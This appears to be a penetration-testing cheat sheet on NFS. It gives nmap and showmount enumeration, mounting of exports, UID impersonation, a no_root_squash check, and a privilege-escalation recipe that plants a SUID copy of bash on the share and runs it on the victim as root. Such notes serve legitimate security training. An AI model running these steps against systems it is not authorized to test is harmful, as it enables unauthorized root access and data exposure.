# NFS
```table-of-contents
```
## Discovery & Enumeration
```shell
# Nmap - Discovery
# Scripts will list exports and permissions automatically
nmap -p 111,2049 -sV -sC <IP>
nmap --script nfs* -p 111,2049 <IP>

# Show Available Exports (The most important command)
# Lists what folders you are allowed to mount
showmount -e <IP>
```
## Mounting Shares
```shell
# 1. Create a local mount point
mkdir /mnt/target_nfs

# 2. Mount the share
# -o nolock: Often needed for older servers or if NLM port is filtered
# Syntax: mount -t nfs <IP>:<REMOTE_SHARE> <LOCAL_DIR>
sudo mount -t nfs <IP>:/var/www /mnt/target_nfs -o nolock

# 3. Mount specific version (if default fails)
sudo mount -t nfs -o vers=2 <IP>:/share /mnt/target_nfs
```
## Permissions Analysis (UID/GID)
```shell
# List files with Numeric UIDs (Critical)
# If a file is owned by UID 1000, and you create a local user with UID 1000,
# you will have access to that file.
ls -n /mnt/target_nfs
```
## Exploitation: Root Squashing
### Check for no_root_squash
1. Look at Nmap output or `/etc/exports` (if readable).
2. Or simply try to create a file as root.
```shell
# As root on Kali:
touch /mnt/target_nfs/test_root
ls -l /mnt/target_nfs/test_root
# If owner is 'root' (UID 0), the share is vulnerable.
# If owner is 'nfsnobody' or similar, it is NOT vulnerable.
```
### Privilege Escalation Technique
```shell
# 1. On Kali (as root): Copy bash to the share
cp /bin/bash /mnt/target_nfs/root_bash

# 2. Give it SUID permissions
chmod +s /mnt/target_nfs/root_bash

# 3. On Victim Machine (User shell): Execute it
# -p preserves permissions (runs as owner, which is root)
./root_bash -p
# You are now root.
```
## Unmounting
```shell
# Standard unmount
sudo umount /mnt/target_nfs

# Force unmount (if the share is stuck/frozen)
sudo umount -f -l /mnt/target_nfs
```
## Config File
```shell
cat /etc/exports 
```